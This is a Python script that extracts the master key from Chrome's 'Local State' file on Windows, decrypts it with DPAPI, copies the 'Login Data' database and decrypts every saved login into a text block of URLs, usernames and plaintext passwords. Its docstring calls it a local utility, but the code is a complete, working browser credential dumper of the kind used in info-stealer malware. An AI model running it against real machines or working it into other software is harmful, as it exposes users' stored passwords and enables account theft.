"""
This script retrieves and decrypts saved passwords from Google Chrome's 'Login Data' database
on Windows. It accesses the master AES key, which is encrypted with Windows DPAPI and stored
in the 'Local State' file. This AES key is then used to decrypt the encrypted password entries
stored in the 'Login Data' SQLite database.

Requirements:
    - pywin32: Provides access to Windows DPAPI for decrypting the master AES key.
    - pycryptodome: Used to handle AES-GCM decryption for encrypted passwords.

Functions:
    - get_master_key: Retrieves and decrypts the master AES key from Chrome's 'Local State' file.
    - decrypt_password: Decrypts an AES-256-GCM encrypted password using the master key.
    - fetch_passwords: Connects to Chrome's 'Login Data' SQLite database, retrieves and decrypts login credentials.

Note:
    This script should only be used on the same machine and user profile where Chrome's data is stored,
    as DPAPI ties decryption to the specific user and machine.
    For privacy concerns, appropriate permissions should be given to access and decrypt this data.
"""

import json
import base64
import win32crypt
import os
import sqlite3
import shutil
import tempfile
from Crypto.Cipher import AES

def get_master_key(browser_path):
    """
    Retrieves and decrypts the master AES key from browsers's 'Local State' file.

    This master key is used to decrypt other sensitive data, such as passwords, stored
    in Chrome's 'Login Data' database. The key is encrypted with DPAPI and needs to be
    decrypted on the same machine and user profile where it was originally created.

    Returns:
        bytes: The decrypted master AES key.
    """
    local_state_path = os.path.join(browser_path, "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Strip the DPAPI prefix
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Could not retrieve master key from {local_state_path}: {e}")
        return None

def decrypt_password(encrypted_password, master_key):
    """
    Decrypts an AES-256-GCM encrypted password using the provided master key.

    Chrome stores passwords with AES-GCM encryption. This function extracts the nonce,
    ciphertext, and tag from the encrypted password blob, and then decrypts it with the master key.

    Args:
        encrypted_password (bytes): The AES-GCM encrypted password blob.
        master_key (bytes): The decrypted master AES key used for decryption.

    Returns:
        str: The decrypted password as a UTF-8 string.
    """
    # AES-GCM requires a nonce which is typically the first 12 bytes of the encrypted data
    nonce = encrypted_password[3:15]
    ciphertext = encrypted_password[15:-16]  # Ciphertext excluding nonce and tag
    tag = encrypted_password[-16:]  # Last 16 bytes are the tag

    # Set up AES-GCM cipher with the master key and nonce
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
    return decrypted_password.decode("utf-8")

def fetch_passwords(browser_path):
    """
    Connects to Chrome's 'Login Data' SQLite database, retrieves login credentials, and decrypts them.

    This function uses the master AES key to decrypt the passwords stored in the database.
    It then prints out the URL, username, and decrypted password for each login entry.
    """
    master_key = get_master_key(browser_path)

    login_data_path = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(login_data_path):
        return "No login data file found."

    # Create a temporary copy of the database
    temp_dir = tempfile.gettempdir()
    temp_login_data_path = os.path.join(temp_dir, "Login_Data_copy")
    shutil.copy2(login_data_path, temp_login_data_path)

    conn = sqlite3.connect(temp_login_data_path)
    cursor = conn.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    data = "Passwords:\n"
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        try:
            decrypted_password = decrypt_password(encrypted_password, master_key)
            data += f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}\n"
        except Exception as e:
            data += f"Failed to decrypt password for {url}: {e}\n"

    conn.close()
    os.remove(temp_login_data_path)
    return data
